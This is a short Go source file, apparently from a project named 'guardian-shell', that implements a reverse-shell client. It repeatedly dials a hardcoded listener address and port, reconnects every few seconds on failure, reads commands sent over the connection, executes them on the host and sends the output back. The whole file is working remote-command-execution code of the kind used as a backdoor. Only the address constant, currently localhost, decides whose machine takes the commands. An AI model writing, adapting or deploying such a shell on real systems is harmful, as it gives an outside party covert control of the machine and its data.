package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/avvvet/guardian-shell/internal/utils"
)

const (
	reverseIP   = "127.0.0.1"
	reversePort = 20090
	retryDelay  = 5
)

func main() {
	for {

		address := fmt.Sprintf("%s:%d", reverseIP, reversePort)

		conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Printf("Error connecting to the guardian shell listner. Retrying in %d seconds...\n", retryDelay)
			time.Sleep(time.Second * retryDelay)
			continue
		}
		defer conn.Close()

		log.Println("Connected to the reverse guardian listern!")

		for {
			command, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				fmt.Println("Error reading command:", err)
				break
			}

			output, err := utils.ExecuteCommands(command)
			if err != nil {
				fmt.Println("Error executing command:", err)
			}
			// log the coming comman
			log.Printf("$ %s", command)

			//send command output to guardian listner
			fmt.Fprint(conn, output)
		}

	}

}
